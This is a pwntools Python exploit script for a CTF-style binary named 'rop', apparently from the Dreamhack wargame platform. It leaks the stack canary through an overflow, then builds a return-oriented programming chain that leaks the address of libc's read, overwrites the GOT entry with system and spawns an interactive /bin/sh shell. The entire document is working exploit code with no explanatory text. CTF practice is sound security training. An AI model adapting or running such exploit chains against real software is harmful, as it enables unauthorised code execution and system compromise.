from pwn import *

p = process("./rop")
#p = remote("host8.dreamhack.games",10574)
e = ELF("./rop")
libc = ELF("./libc.so.6")

context.update(arch='amd64', os='linux')

pop_rsi_r15 = 0x400851
pop_rdi = 0x400853
ret = 0x400596

write_plt = e.plt["write"]
read_plt = e.plt["read"]
read_got = e.got["read"]

payload = b'A'*0x39

p.sendafter("Buf: ",payload)
p.recvuntil(payload)
canary = u64(b"\00"+p.recv(7))

payload = b'A'*0x38
payload += p64(canary)
payload += b'B'*0x8

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter("Buf: ",payload)

Read = u64(p.recvn(6)+b'\x00'*2)
lb = Read - libc.symbols["read"]
system = lb + libc.symbols["system"]

p.send(p64(system)+ b'/bin/sh\x00')

p.interactive()